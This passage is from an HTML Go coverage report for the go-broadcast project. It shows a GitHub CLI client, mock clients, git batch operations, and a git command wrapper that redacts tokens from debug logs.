        if err != nil </span><span class="cov8" title="1">{
                if isNotFoundError(err) </span><span class="cov8" title="1">{
                        return ErrBranchNotFound
                }</span>
                <span class="cov8" title="1">return appErrors.WrapWithContext(err, "delete branch")</span>
        }

        <span class="cov8" title="1">return nil</span>
}

// UpdatePR updates a pull request
func (g *githubClient) UpdatePR(ctx context.Context, repo string, number int, updates PRUpdate) error <span class="cov8" title="1">{
        jsonData, err := jsonutil.MarshalJSON(updates)
        if err != nil </span><span class="cov0" title="0">{
                return appErrors.WrapWithContext(err, "marshal PR update")
        }</span>

        <span class="cov8" title="1">_, err = g.runner.RunWithInput(ctx, jsonData, "gh", "api", fmt.Sprintf("repos/%s/pulls/%d", repo, number), "--method", "PATCH", "--input", "-")
        if err != nil </span><span class="cov8" title="1">{
                if isNotFoundError(err) </span><span class="cov8" title="1">{
                        return ErrPRNotFound
                }</span>
                <span class="cov8" title="1">return appErrors.WrapWithContext(err, "update PR")</span>
        }

        <span class="cov8" title="1">return nil</span>
}

// addPRComment adds a comment to a pull request
func (g *githubClient) addPRComment(ctx context.Context, repo string, number int, comment string) error <span class="cov8" title="1">{
        commentData := map[string]string{
                "body": comment,
        }

        jsonData, err := jsonutil.MarshalJSON(commentData)
        if err != nil </span><span class="cov0" title="0">{
                return appErrors.WrapWithContext(err, "marshal comment")
        }</span>

        <span class="cov8" title="1">_, err = g.runner.RunWithInput(ctx, jsonData, "gh", "api", fmt.Sprintf("repos/%s/issues/%d/comments", repo, number), "--method", "POST", "--input", "-")
        if err != nil </span><span class="cov0" title="0">{
                return appErrors.WrapWithContext(err, "add PR comment")
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// GetCurrentUser returns the authenticated user
func (g *githubClient) GetCurrentUser(ctx context.Context) (*User, error) <span class="cov8" title="1">{
        // Return cached user if available
        if g.currentUser != nil </span><span class="cov8" title="1">{
                return g.currentUser, nil
        }</span>

        <span class="cov8" title="1">output, err := g.runner.Run(ctx, "gh", "api", "user")
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "get current user")
        }</span>

        <span class="cov8" title="1">user, err := jsonutil.UnmarshalJSON[User](output)
        if err != nil </span><span class="cov0" title="0">{
                return nil, appErrors.WrapWithContext(err, "parse user")
        }</span>

        // Cache the user for future calls
        <span class="cov8" title="1">g.currentUser = &amp;user

        return &amp;user, nil</span>
}

// GetGitTree retrieves the Git tree for a repository
func (g *githubClient) GetGitTree(ctx context.Context, repo, treeSHA string, recursive bool) (*GitTree, error) <span class="cov0" title="0">{
        apiURL := fmt.Sprintf("repos/%s/git/trees/%s", repo, treeSHA)
        if recursive </span><span class="cov0" title="0">{
                apiURL += "?recursive=1"
        }</span>

        <span class="cov0" title="0">output, err := g.runner.Run(ctx, "gh", "api", apiURL)
        if err != nil </span><span class="cov0" title="0">{
                if isNotFoundError(err) </span><span class="cov0" title="0">{
                        return nil, fmt.Errorf("%w: %s", ErrGitTreeNotFound, treeSHA)
                }</span>
                <span class="cov0" title="0">return nil, appErrors.WrapWithContext(err, "get git tree")</span>
        }

        <span class="cov0" title="0">gitTree, err := jsonutil.UnmarshalJSON[GitTree](output)
        if err != nil </span><span class="cov0" title="0">{
                return nil, appErrors.WrapWithContext(err, "parse git tree")
        }</span>

        <span class="cov0" title="0">return &amp;gitTree, nil</span>
}

// isNotFoundError checks if the error is a 404 from GitHub API
func isNotFoundError(err error) bool <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return false
        }</span>

        // Check for common 404 patterns in error messages
        <span class="cov8" title="1">errStr := err.Error()
        return strings.Contains(errStr, "404") ||
                strings.Contains(errStr, "Not Found") ||
                strings.Contains(errStr, "could not resolve")</span>
}

// NewClientWithRunner creates a GitHub client with a custom command runner (for testing)
func NewClientWithRunner(runner CommandRunner, logger *logrus.Logger) Client <span class="cov8" title="1">{
        return &amp;githubClient{
                runner:      runner,
                logger:      logger,
                currentUser: nil,
        }
}</span>
</pre>

		<pre class="file" id="file31" style="display: none">package gh

import (
        "context"

        "github.com/stretchr/testify/mock"

        "github.com/mrz1836/go-broadcast/internal/testutil"
)

// MockClient is a mock implementation of the Client interface
type MockClient struct {
        mock.Mock
}

// NewMockClient creates a new MockClient (backward compatibility)
func NewMockClient() *MockClient <span class="cov0" title="0">{
        return &amp;MockClient{}
}</span>

// ListBranches mock implementation
func (m *MockClient) ListBranches(ctx context.Context, repo string) ([]Branch, error) <span class="cov8" title="1">{
        args := m.Called(ctx, repo)
        return testutil.HandleTwoValueReturn[[]Branch](args)
}</span>

// GetBranch mock implementation
func (m *MockClient) GetBranch(ctx context.Context, repo, branch string) (*Branch, error) <span class="cov8" title="1">{
        args := m.Called(ctx, repo, branch)
        return testutil.HandleTwoValueReturn[*Branch](args)
}</span>

// CreatePR mock implementation
func (m *MockClient) CreatePR(ctx context.Context, repo string, req PRRequest) (*PR, error) <span class="cov8" title="1">{
        args := m.Called(ctx, repo, req)
        return testutil.HandleTwoValueReturn[*PR](args)
}</span>

// GetPR mock implementation
func (m *MockClient) GetPR(ctx context.Context, repo string, number int) (*PR, error) <span class="cov8" title="1">{
        args := m.Called(ctx, repo, number)
        return testutil.HandleTwoValueReturn[*PR](args)
}</span>

// ListPRs mock implementation
func (m *MockClient) ListPRs(ctx context.Context, repo, state string) ([]PR, error) <span class="cov8" title="1">{
        args := m.Called(ctx, repo, state)
        return testutil.HandleTwoValueReturn[[]PR](args)
}</span>

// GetFile mock implementation
func (m *MockClient) GetFile(ctx context.Context, repo, path, ref string) (*FileContent, error) <span class="cov8" title="1">{
        args := m.Called(ctx, repo, path, ref)
        return testutil.HandleTwoValueReturn[*FileContent](args)
}</span>

// GetCommit mock implementation
func (m *MockClient) GetCommit(ctx context.Context, repo, sha string) (*Commit, error) <span class="cov8" title="1">{
        args := m.Called(ctx, repo, sha)
        return testutil.HandleTwoValueReturn[*Commit](args)
}</span>

// ClosePR mock implementation
func (m *MockClient) ClosePR(ctx context.Context, repo string, number int, comment string) error <span class="cov0" title="0">{
        args := m.Called(ctx, repo, number, comment)
        return args.Error(0)
}</span>

// DeleteBranch mock implementation
func (m *MockClient) DeleteBranch(ctx context.Context, repo, branch string) error <span class="cov0" title="0">{
        args := m.Called(ctx, repo, branch)
        return args.Error(0)
}</span>

// UpdatePR mock implementation
func (m *MockClient) UpdatePR(ctx context.Context, repo string, number int, updates PRUpdate) error <span class="cov0" title="0">{
        args := m.Called(ctx, repo, number, updates)
        return args.Error(0)
}</span>

// GetCurrentUser mock implementation
func (m *MockClient) GetCurrentUser(ctx context.Context) (*User, error) <span class="cov0" title="0">{
        args := m.Called(ctx)
        return testutil.HandleTwoValueReturn[*User](args)
}</span>

// GetGitTree mock implementation
func (m *MockClient) GetGitTree(ctx context.Context, repo, treeSHA string, recursive bool) (*GitTree, error) <span class="cov0" title="0">{
        args := m.Called(ctx, repo, treeSHA, recursive)
        return testutil.HandleTwoValueReturn[*GitTree](args)
}</span>
</pre>

		<pre class="file" id="file32" style="display: none">package git

import (
        "context"
        "errors"
        "fmt"
        "os/exec"
        "strings"
)

// BatchClient extends the basic Client interface with batch operations
type BatchClient interface {
        Client
        BatchAddFiles(ctx context.Context, repoPath string, files []string) error
        BatchStatus(ctx context.Context, repoPath string, files []string) (map[string]string, error)
}

// Ensure gitClient implements BatchClient
var _ BatchClient = (*gitClient)(nil)

// BatchAddFiles adds multiple files in optimized batches to avoid command line length limits
func (g *gitClient) BatchAddFiles(ctx context.Context, repoPath string, files []string) error <span class="cov0" title="0">{
        if len(files) == 0 </span><span class="cov0" title="0">{
                return nil
        }</span>

        // Batch files to avoid command line length limits
        <span class="cov0" title="0">const maxBatchSize = 100

        for i := 0; i &lt; len(files); i += maxBatchSize </span><span class="cov0" title="0">{
                end := i + maxBatchSize
                if end &gt; len(files) </span><span class="cov0" title="0">{
                        end = len(files)
                }</span>

                <span class="cov0" title="0">batch := files[i:end]
                args := []string{"-C", repoPath, "add"}
                args = append(args, batch...)

                cmd := exec.CommandContext(ctx, "git", args...) //nolint:gosec // Arguments are safely constructed

                if err := g.runCommand(cmd); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("batch add failed for files %d-%d: %w", i, end-1, err)
                }</span>
        }

        <span class="cov0" title="0">return nil</span>
}

// BatchStatus gets status for multiple files efficiently using a single git command
func (g *gitClient) BatchStatus(ctx context.Context, repoPath string, files []string) (map[string]string, error) <span class="cov0" title="0">{
        if len(files) == 0 </span><span class="cov0" title="0">{
                return make(map[string]string), nil
        }</span>

        <span class="cov0" title="0">args := []string{"-C", repoPath, "status", "--porcelain", "--"}
        args = append(args, files...)

        cmd := exec.CommandContext(ctx, "git", args...) //nolint:gosec // Arguments are safely constructed

        output, err := cmd.Output()
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("batch status failed: %w", err)
        }</span>

        <span class="cov0" title="0">statuses := make(map[string]string)
        lines := strings.Split(string(output), "\n")

        for _, line := range lines </span><span class="cov0" title="0">{
                if len(line) &lt; 3 </span><span class="cov0" title="0">{
                        continue</span>
                }

                <span class="cov0" title="0">status := line[:2]
                file := strings.TrimSpace(line[3:])
                statuses[file] = status</span>
        }

        <span class="cov0" title="0">return statuses, nil</span>
}

// BatchStatusAll gets status for all files in the repository
func (g *gitClient) BatchStatusAll(ctx context.Context, repoPath string) (map[string]string, error) <span class="cov0" title="0">{
        args := []string{"-C", repoPath, "status", "--porcelain"}

        cmd := exec.CommandContext(ctx, "git", args...) //nolint:gosec // Arguments are safely constructed

        output, err := cmd.Output()
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("batch status all failed: %w", err)
        }</span>

        <span class="cov0" title="0">statuses := make(map[string]string)
        lines := strings.Split(string(output), "\n")

        for _, line := range lines </span><span class="cov0" title="0">{
                if len(line) &lt; 3 </span><span class="cov0" title="0">{
                        continue</span>
                }

                <span class="cov0" title="0">status := line[:2]
                file := strings.TrimSpace(line[3:])
                statuses[file] = status</span>
        }

        <span class="cov0" title="0">return statuses, nil</span>
}

// BatchDiffFiles gets diff for multiple files efficiently
func (g *gitClient) BatchDiffFiles(ctx context.Context, repoPath string, files []string, staged bool) (map[string]string, error) <span class="cov0" title="0">{
        if len(files) == 0 </span><span class="cov0" title="0">{
                return make(map[string]string), nil
        }</span>

        <span class="cov0" title="0">diffs := make(map[string]string)

        // Process files in smaller batches to avoid command line length limits
        const maxBatchSize = 50

        for i := 0; i &lt; len(files); i += maxBatchSize </span><span class="cov0" title="0">{
                end := i + maxBatchSize
                if end &gt; len(files) </span><span class="cov0" title="0">{
                        end = len(files)
                }</span>

                <span class="cov0" title="0">batch := files[i:end]
                args := []string{"-C", repoPath, "diff", "--name-only"}
                if staged </span><span class="cov0" title="0">{
                        args = append(args, "--staged")
                }</span>
                <span class="cov0" title="0">args = append(args, "--")
                args = append(args, batch...)

                cmd := exec.CommandContext(ctx, "git", args...) //nolint:gosec // Arguments are safely constructed

                output, err := cmd.Output()
                if err != nil </span><span class="cov0" title="0">{
                        return nil, fmt.Errorf("batch diff failed for files %d-%d: %w", i, end-1, err)
                }</span>

                // Get individual diffs for files that have changes
                <span class="cov0" title="0">changedFiles := strings.Split(strings.TrimSpace(string(output)), "\n")
                for _, file := range changedFiles </span><span class="cov0" title="0">{
                        if file == "" </span><span class="cov0" title="0">{
                                continue</span>
                        }

                        // Get the actual diff for this file
                        <span class="cov0" title="0">diffArgs := []string{"-C", repoPath, "diff"}
                        if staged </span><span class="cov0" title="0">{
                                diffArgs = append(diffArgs, "--staged")
                        }</span>
                        <span class="cov0" title="0">diffArgs = append(diffArgs, "--", file)

                        diffCmd := exec.CommandContext(ctx, "git", diffArgs...) //nolint:gosec // Arguments are safely constructed
                        diffOutput, err := diffCmd.Output()
                        if err != nil </span><span class="cov0" title="0">{
                                return nil, fmt.Errorf("failed to get diff for file %s: %w", file, err)
                        }</span>

                        <span class="cov0" title="0">diffs[file] = string(diffOutput)</span>
                }
        }

        <span class="cov0" title="0">return diffs, nil</span>
}

// BatchCheckIgnored checks if multiple files are ignored by git
func (g *gitClient) BatchCheckIgnored(ctx context.Context, repoPath string, files []string) (map[string]bool, error) <span class="cov0" title="0">{
        if len(files) == 0 </span><span class="cov0" title="0">{
                return make(map[string]bool), nil
        }</span>

        <span class="cov0" title="0">args := []string{"-C", repoPath, "check-ignore"}
        args = append(args, files...)

        cmd := exec.CommandContext(ctx, "git", args...) //nolint:gosec // Arguments are safely constructed

        output, err := cmd.Output()
        // git check-ignore returns exit code 1 when files are not ignored, which is not an error
        if err != nil </span><span class="cov0" title="0">{
                var exitErr *exec.ExitError
                if errors.As(err, &amp;exitErr) &amp;&amp; exitErr.ExitCode() == 1 </span><span class="cov0" title="0">{
                        // Files are not ignored - this is expected, continue processing
                        err = nil
                }</span>
                <span class="cov0" title="0">if err != nil </span><span class="cov0" title="0">{
                        return nil, fmt.Errorf("batch check-ignore failed: %w", err)
                }</span>
        }

        <span class="cov0" title="0">ignored := make(map[string]bool)

        // Initialize all files as not ignored
        for _, file := range files </span><span class="cov0" title="0">{
                ignored[file] = false
        }</span>

        // Mark ignored files as true
        <span class="cov0" title="0">if string(output) != "" </span><span class="cov0" title="0">{
                ignoredFiles := strings.Split(strings.TrimSpace(string(output)), "\n")
                for _, file := range ignoredFiles </span><span class="cov0" title="0">{
                        if file != "" </span><span class="cov0" title="0">{
                                ignored[file] = true
                        }</span>
                }
        }

        <span class="cov0" title="0">return ignored, nil</span>
}

// BatchRemoveFiles removes multiple files from git tracking efficiently
func (g *gitClient) BatchRemoveFiles(ctx context.Context, repoPath string, files []string, keepLocal bool) error <span class="cov0" title="0">{
        if len(files) == 0 </span><span class="cov0" title="0">{
                return nil
        }</span>

        // Batch files to avoid command line length limits
        <span class="cov0" title="0">const maxBatchSize = 100

        for i := 0; i &lt; len(files); i += maxBatchSize </span><span class="cov0" title="0">{
                end := i + maxBatchSize
                if end &gt; len(files) </span><span class="cov0" title="0">{
                        end = len(files)
                }</span>

                <span class="cov0" title="0">batch := files[i:end]
                args := []string{"-C", repoPath, "rm"}
                if keepLocal </span><span class="cov0" title="0">{
                        args = append(args, "--cached")
                }</span>
                <span class="cov0" title="0">args = append(args, batch...)

                cmd := exec.CommandContext(ctx, "git", args...) //nolint:gosec // Arguments are safely constructed

                if err := g.runCommand(cmd); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("batch remove failed for files %d-%d: %w", i, end-1, err)
                }</span>
        }

        <span class="cov0" title="0">return nil</span>
}
</pre>

		<pre class="file" id="file33" style="display: none">package git

import (
        "bytes"
        "context"
        "errors"
        "fmt"
        "net/url"
        "os"
        "os/exec"
        "regexp"
        "strings"
        "time"

        "github.com/sirupsen/logrus"

        appErrors "github.com/mrz1836/go-broadcast/internal/errors"
        "github.com/mrz1836/go-broadcast/internal/logging"
)

// Common errors
var (
        ErrGitNotFound      = errors.New("git command not found in PATH")
        ErrNotARepository   = errors.New("not a git repository")
        ErrRepositoryExists = errors.New("repository already exists")
        ErrNoChanges        = errors.New("no changes to commit")
        ErrGitCommand       = errors.New("git command failed")
        ErrInvalidRepoURL   = errors.New("invalid repository URL format")
)

// gitClient implements the Client interface using git commands
type gitClient struct {
        logger    *logrus.Logger
        logConfig *logging.LogConfig
}

// NewClient creates a new Git client.
//
// Parameters:
// - logger: Logger instance for general logging
// - logConfig: Configuration for debug logging and verbose settings
//
// Returns:
// - Git client interface implementation
// - Error if git command is not available in PATH
func NewClient(logger *logrus.Logger, logConfig *logging.LogConfig) (Client, error) <span class="cov8" title="1">{
        // Check if git is available
        if _, err := exec.LookPath("git"); err != nil </span><span class="cov8" title="1">{
                return nil, ErrGitNotFound
        }</span>

        <span class="cov8" title="1">return &amp;gitClient{
                logger:    logger,
                logConfig: logConfig,
        }, nil</span>
}

// Clone clones a repository to the specified path
func (g *gitClient) Clone(ctx context.Context, url, path string) error <span class="cov8" title="1">{
        // Check if path already exists
        if _, err := os.Stat(path); err == nil </span><span class="cov0" title="0">{
                return fmt.Errorf("%w: %s", ErrRepositoryExists, path)
        }</span>

        <span class="cov8" title="1">cmd := exec.CommandContext(ctx, "git", "clone", url, path)

        cmd.Env = append(os.Environ(), "GIT_TERMINAL_PROMPT=0")

        if err := g.runCommand(cmd); err != nil </span><span class="cov8" title="1">{
                return appErrors.WrapWithContext(err, "clone repository")
        }</span>

        <span class="cov0" title="0">return nil</span>
}

// Checkout switches to the specified branch
func (g *gitClient) Checkout(ctx context.Context, repoPath, branch string) error <span class="cov8" title="1">{
        cmd := exec.CommandContext(ctx, "git", "-C", repoPath, "checkout", branch)

        if err := g.runCommand(cmd); err != nil </span><span class="cov8" title="1">{
                return appErrors.WrapWithContext(err, fmt.Sprintf("checkout branch %s", branch))
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// CreateBranch creates a new branch from the current HEAD
func (g *gitClient) CreateBranch(ctx context.Context, repoPath, branch string) error <span class="cov8" title="1">{
        cmd := exec.CommandContext(ctx, "git", "-C", repoPath, "checkout", "-b", branch)

        if err := g.runCommand(cmd); err != nil </span><span class="cov8" title="1">{
                return appErrors.WrapWithContext(err, fmt.Sprintf("create branch %s", branch))
        }</span>

        <span class="cov0" title="0">return nil</span>
}

// Add stages files for commit
func (g *gitClient) Add(ctx context.Context, repoPath string, paths ...string) error <span class="cov8" title="1">{
        args := []string{"-C", repoPath, "add"}
        args = append(args, paths...)

        cmd := exec.CommandContext(ctx, "git", args...) //nolint:gosec // Arguments are safely constructed

        if err := g.runCommand(cmd); err != nil </span><span class="cov8" title="1">{
                return appErrors.WrapWithContext(err, "add files")
        }</span>

        <span class="cov0" title="0">return nil</span>
}

// Commit creates a commit with the given message
func (g *gitClient) Commit(ctx context.Context, repoPath, message string) error <span class="cov8" title="1">{
        cmd := exec.CommandContext(ctx, "git", "-C", repoPath, "commit", "-m", message)

        if err := g.runCommand(cmd); err != nil </span><span class="cov8" title="1">{
                // Check if it's because there are no changes
                errStr := err.Error()
                if strings.Contains(errStr, "nothing to commit") ||
                        strings.Contains(errStr, "no changes") ||
                        strings.Contains(errStr, "working tree clean") ||
                        strings.Contains(errStr, "nothing added to commit") </span><span class="cov0" title="0">{
                        return ErrNoChanges
                }</span>
                <span class="cov8" title="1">return appErrors.WrapWithContext(err, "commit")</span>
        }

        <span class="cov0" title="0">return nil</span>
}

// Push pushes the current branch to the remote
func (g *gitClient) Push(ctx context.Context, repoPath, remote, branch string, force bool) error <span class="cov8" title="1">{
        args := []string{"-C", repoPath, "push", remote, branch}
        if force </span><span class="cov0" title="0">{
                args = append(args, "--force")
        }</span>

        <span class="cov8" title="1">cmd := exec.CommandContext(ctx, "git", args...) //nolint:gosec // Arguments are safely constructed

        cmd.Env = append(os.Environ(), "GIT_TERMINAL_PROMPT=0")

        if err := g.runCommand(cmd); err != nil </span><span class="cov8" title="1">{
                return appErrors.WrapWithContext(err, "push")
        }</span>

        <span class="cov0" title="0">return nil</span>
}

// Diff returns the diff of changes
func (g *gitClient) Diff(ctx context.Context, repoPath string, staged bool) (string, error) <span class="cov8" title="1">{
        args := []string{"-C", repoPath, "diff"}
        if staged </span><span class="cov0" title="0">{
                args = append(args, "--staged")
        }</span>

        <span class="cov8" title="1">cmd := exec.CommandContext(ctx, "git", args...) //nolint:gosec // Arguments are safely constructed

        output, err := cmd.Output()
        if err != nil </span><span class="cov8" title="1">{
                return "", appErrors.WrapWithContext(err, "get diff")
        }</span>

        <span class="cov0" title="0">return string(output), nil</span>
}

// GetCurrentBranch returns the name of the current branch
func (g *gitClient) GetCurrentBranch(ctx context.Context, repoPath string) (string, error) <span class="cov8" title="1">{
        cmd := exec.CommandContext(ctx, "git", "-C", repoPath, "branch", "--show-current")

        output, err := cmd.Output()
        if err != nil </span><span class="cov8" title="1">{
                // Try alternative method for older git versions
                cmd = exec.CommandContext(ctx, "git", "-C", repoPath, "symbolic-ref", "--short", "HEAD")

                output, err = cmd.Output()
                if err != nil </span><span class="cov8" title="1">{
                        return "", appErrors.WrapWithContext(err, "get current branch")
                }</span>
        }

        <span class="cov0" title="0">return strings.TrimSpace(string(output)), nil</span>
}

// GetRemoteURL returns the URL of the specified remote
func (g *gitClient) GetRemoteURL(ctx context.Context, repoPath, remote string) (string, error) <span class="cov8" title="1">{
        cmd := exec.CommandContext(ctx, "git", "-C", repoPath, "remote", "get-url", remote)

        output, err := cmd.Output()
        if err != nil </span><span class="cov8" title="1">{
                return "", appErrors.WrapWithContext(err, "get remote URL")
        }</span>

        <span class="cov8" title="1">return strings.TrimSpace(string(output)), nil</span>
}

// AddRemote adds a new remote to the repository
func (g *gitClient) AddRemote(ctx context.Context, repoPath, remoteName, remoteURL string) error <span class="cov0" title="0">{
        cmd := exec.CommandContext(ctx, "git", "-C", repoPath, "remote", "add", remoteName, remoteURL)

        if err := g.runCommand(cmd); err != nil </span><span class="cov0" title="0">{
                return appErrors.WrapWithContext(err, "add remote")
        }</span>

        <span class="cov0" title="0">return nil</span>
}

// GetCurrentCommitSHA returns the SHA of the current commit
func (g *gitClient) GetCurrentCommitSHA(ctx context.Context, repoPath string) (string, error) <span class="cov8" title="1">{
        cmd := exec.CommandContext(ctx, "git", "-C", repoPath, "rev-parse", "HEAD")

        output, err := cmd.Output()
        if err != nil </span><span class="cov8" title="1">{
                return "", appErrors.WrapWithContext(err, "get current commit SHA")
        }</span>

        <span class="cov8" title="1">return strings.TrimSpace(string(output)), nil</span>
}

// GetRepositoryInfo extracts repository information from Git remote
func (g *gitClient) GetRepositoryInfo(ctx context.Context, repoPath string) (*RepositoryInfo, error) <span class="cov8" title="1">{
        // Get the origin remote URL
        remoteURL, err := g.GetRemoteURL(ctx, repoPath, "origin")
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "get repository info")
        }</span>

        <span class="cov8" title="1">return parseRepositoryURL(remoteURL)</span>
}

// parseRepositoryURL parses a Git remote URL and extracts repository information
func parseRepositoryURL(remoteURL string) (*RepositoryInfo, error) <span class="cov8" title="1">{
        // Handle SSH URLs (git@github.com:owner/repo.git)
        sshPattern := regexp.MustCompile(`^git@([^:]+):([^/]+)/(.+?)(?:\.git)?$`)
        if matches := sshPattern.FindStringSubmatch(remoteURL); len(matches) == 4 </span><span class="cov8" title="1">{
                host := matches[1]
                owner := matches[2]
                repo := matches[3]

                return &amp;RepositoryInfo{
                        Name:     repo,
                        Owner:    owner,
                        FullName: fmt.Sprintf("%s/%s", owner, repo),
                        URL:      remoteURL,
                        IsGitHub: host == "github.com",
                }, nil
        }</span>

        // Handle HTTPS URLs
        <span class="cov8" title="1">parsedURL, err := url.Parse(remoteURL)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to parse repository URL: %w", err)
        }</span>

        // Extract owner and repository from path
        <span class="cov8" title="1">path := strings.Trim(parsedURL.Path, "/")
        path = strings.TrimSuffix(path, ".git")

        parts := strings.Split(path, "/")
        if len(parts) &lt; 2 </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("%w: %s", ErrInvalidRepoURL, remoteURL)
        }</span>

        <span class="cov8" title="1">owner := parts[0]
        repo := parts[1]

        return &amp;RepositoryInfo{
                Name:     repo,
                Owner:    owner,
                FullName: fmt.Sprintf("%s/%s", owner, repo),
                URL:      remoteURL,
                IsGitHub: parsedURL.Host == "github.com",
        }, nil</span>
}

// runCommand executes a git command with comprehensive debug logging support.
//
// This method provides detailed visibility into git command execution when debug
// logging is enabled, including command details, timing, output capture, and
// environment variable filtering for security.
//
// Parameters:
// - cmd: The exec.Cmd to execute
//
// Returns:
// - Error if command execution fails
//
// Side Effects:
// - Logs command execution details when --debug-git flag is enabled
// - Captures and logs real-time stdout/stderr output at trace level
// - Records command timing and exit code information
func (g *gitClient) runCommand(cmd *exec.Cmd) error <span class="cov8" title="1">{
        logger := logging.WithStandardFields(g.logger, g.logConfig, logging.ComponentNames.Git)

        // Debug logging when --debug-git flag is enabled
        if g.logConfig != nil &amp;&amp; g.logConfig.Debug.Git </span><span class="cov8" title="1">{
                logger.WithFields(logrus.Fields{
                        logging.StandardFields.Operation: logging.OperationTypes.GitCommand,
                        "command":                        cmd.Path,
                        "args":                           cmd.Args[1:], // Skip command name for cleaner logs
                        "dir":                            cmd.Dir,
                        "env":                            filterSensitiveEnv(cmd.Env),
                }).Debug("Executing git command")

                // Capture and log output in real-time using debug writers
                cmd.Stdout = &amp;debugWriter{logger: logger, prefix: "stdout"}
                cmd.Stderr = &amp;debugWriter{logger: logger, prefix: "stderr"}
        }</span> else<span class="cov8" title="1"> {
                // Fallback to buffer capture for error handling
                var stderr bytes.Buffer
                var stdout bytes.Buffer
                cmd.Stderr = &amp;stderr
                cmd.Stdout = &amp;stdout
        }</span>

        // Execute command with timing
        <span class="cov8" title="1">start := time.Now()
        err := cmd.Run()
        duration := time.Since(start)

        // Log completion with timing and exit code
        if g.logConfig != nil &amp;&amp; g.logConfig.Debug.Git </span><span class="cov8" title="1">{
                exitCode := 0
                if cmd.ProcessState != nil </span><span class="cov8" title="1">{
                        exitCode = cmd.ProcessState.ExitCode()
                }</span>

                <span class="cov8" title="1">logger.WithFields(logrus.Fields{
                        logging.StandardFields.DurationMs: duration.Milliseconds(),
                        logging.StandardFields.ExitCode:   exitCode,
                        logging.StandardFields.Status:     "completed",
                }).Debug("Git command completed")</span>
        } else<span class="cov8" title="1"> if g.logger != nil &amp;&amp; g.logger.IsLevelEnabled(logrus.DebugLevel) </span><span class="cov8" title="1">{
                // Basic logging for backwards compatibility
                g.logger.WithField("command", strings.Join(cmd.Args, " ")).Debug("Executing git command")
        }</span>

        // Handle success case
        <span class="cov8" title="1">if err == nil </span><span class="cov8" title="1">{
                return nil
        }</span>

        // Handle error case with detailed logging
        <span class="cov8" title="1">var errMsg, outMsg string
        if g.logConfig == nil || !g.logConfig.Debug.Git </span><span class="cov8" title="1">{
                // Extract error messages from buffers when not using debug writers
                if stderr, ok := cmd.Stderr.(*bytes.Buffer); ok </span><span class="cov8" title="1">{
                        errMsg = stderr.String()
                }</span>
                <span class="cov8" title="1">if stdout, ok := cmd.Stdout.(*bytes.Buffer); ok </span><span class="cov8" title="1">{
                        outMsg = stdout.String()
                }</span>

                <span class="cov8" title="1">if g.logger != nil </span><span class="cov8" title="1">{
                        g.logger.WithFields(logrus.Fields{
                                logging.StandardFields.Component: logging.ComponentNames.Git,
                                "command":                        strings.Join(cmd.Args, " "),
                                logging.StandardFields.Error:     errMsg,
                                "output":                         outMsg,
                                logging.StandardFields.Status:    "failed",
                        }).Error("Git command failed")
                }</span>
        } else<span class="cov8" title="1"> {
                // When using debug logging, command details already logged above
                logger.WithError(err).Error("Git command failed")
        }</span>

        // Check for common error patterns
        <span class="cov8" title="1">if strings.Contains(errMsg, "not a git repository") </span><span class="cov8" title="1">{
                return ErrNotARepository
        }</span>

        // Return error with stderr content (or stdout if stderr is empty)
        <span class="cov8" title="1">if errMsg != "" </span><span class="cov8" title="1">{
                return fmt.Errorf("%w: %s", ErrGitCommand, errMsg)
        }</span>
        <span class="cov8" title="1">if outMsg != "" </span><span class="cov0" title="0">{
                return fmt.Errorf("%w: %s", ErrGitCommand, outMsg)
        }</span>
        <span class="cov8" title="1">return err</span>
}

// debugWriter implements io.Writer for real-time git command output logging.
//
// This writer captures stdout/stderr output from git commands and logs each
// line at trace level when debug logging is enabled, providing real-time
// visibility into git command execution.
type debugWriter struct {
        logger *logrus.Entry
        prefix string
}

// Write implements io.Writer interface for capturing git command output.
//
// Parameters:
// - p: Byte slice containing the output data to log
//
// Returns:
// - Number of bytes written (always len(p))
// - Error (always nil in current implementation)
//
// Side Effects:
// - Logs the output content at trace level with stream identification
func (w *debugWriter) Write(p []byte) (n int, err error) <span class="cov8" title="1">{
        w.logger.WithField("stream", w.prefix).Trace(string(p))
        return len(p), nil
}</span>

// filterSensitiveEnv filters environment variables to redact sensitive information.
//
// This function processes environment variables to identify and redact tokens,
// passwords, and other sensitive information before logging, ensuring security
// compliance while maintaining debugging visibility.
//
// Parameters:
// - env: Slice of environment variable strings in "KEY=VALUE" format
//
// Returns:
// - Filtered slice with sensitive values replaced with "REDACTED"
//
// Security:
// - Automatically redacts GH_TOKEN, GITHUB_TOKEN, and similar patterns
// - Preserves variable names for debugging while protecting values
func filterSensitiveEnv(env []string) []string <span class="cov8" title="1">{
        filtered := make([]string, 0, len(env))
        for _, e := range env </span><span class="cov8" title="1">{
                if strings.HasPrefix(e, "GH_TOKEN=") ||
                        strings.HasPrefix(e, "GITHUB_TOKEN=") ||
                        strings.Contains(strings.ToLower(e), "token=") ||
                        strings.Contains(strings.ToLower(e), "password=") ||
                        strings.Contains(strings.ToLower(e), "secret=") </span><span class="cov8" title="1">{
                        parts := strings.SplitN(e, "=", 2)
                        if len(parts) == 2 </span><span class="cov8" title="1">{
                                filtered = append(filtered, parts[0]+"=REDACTED")
                        }</span> else<span class="cov0" title="0"> {
                                filtered = append(filtered, e)
                        }</span>
                } else<span class="cov8" title="1"> {
                        filtered = append(filtered, e)
                }</span>
        }
        <span class="cov8" title="1">return filtered</span>
}
</pre>

		<pre class="file" id="file34" style="display: none">package git

import (
        "context"

        "github.com/stretchr/testify/mock"

        "github.com/mrz1836/go-broadcast/internal/testutil"
)

// MockClient is a mock implementation of the Client interface
type MockClient struct {
        mock.Mock
}

// NewMockClient creates a new MockClient (backward compatibility)
func NewMockClient() *MockClient <span class="cov8" title="1">{
        return &amp;MockClient{}
}</span>

// Clone mock implementation
func (m *MockClient) Clone(ctx context.Context, url, path string) error <span class="cov8" title="1">{
        args := m.Called(ctx, url, path)
        return testutil.ExtractError(args)
}</span>

// Checkout mock implementation
